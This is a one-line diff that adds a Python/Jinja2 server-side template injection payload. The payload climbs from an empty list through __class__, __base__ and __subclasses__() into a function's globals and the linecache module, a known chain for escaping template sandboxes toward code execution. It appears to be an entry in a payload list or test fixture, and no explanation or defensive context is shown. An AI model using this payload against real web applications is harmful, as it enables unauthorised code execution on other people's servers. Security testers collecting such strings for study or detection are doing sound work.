@@ -1,0 +1,1 @@
+{{[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]}}
